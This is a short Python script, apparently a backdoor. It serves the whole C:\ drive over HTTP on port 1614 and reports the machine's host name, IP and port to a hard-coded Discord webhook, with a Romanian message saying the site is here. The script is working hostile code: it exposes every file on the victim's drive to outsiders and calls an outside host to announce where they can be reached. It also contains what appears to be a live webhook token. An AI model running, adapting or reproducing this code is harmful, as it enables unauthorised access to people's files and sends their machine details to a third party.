from http.server import SimpleHTTPRequestHandler as sbruh, HTTPServer as sus
import socket
from dhooks import Webhook as wh

port = 1614
hn = socket.gethostname()
host = socket.gethostbyname(hn)

dir = 'c:\\'

hook = wh('https://discord.com/api/webhooks/1022142100717961226/0JMe4jR89_40NHZJ5E4bTy3eYEfmOE9gzykA8UFix_QXQWRQ9DmX6XdGsIdSwDRPBcWR')

class Serversus(sbruh):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=dir, **kwargs)

print("serving at port", port)
servsus = sus((host, port), Serversus)
hook.send(f'@here Hei siteu e aici : {host}{port}, host = {hn}')
servsus.serve_forever()
print('uau ?')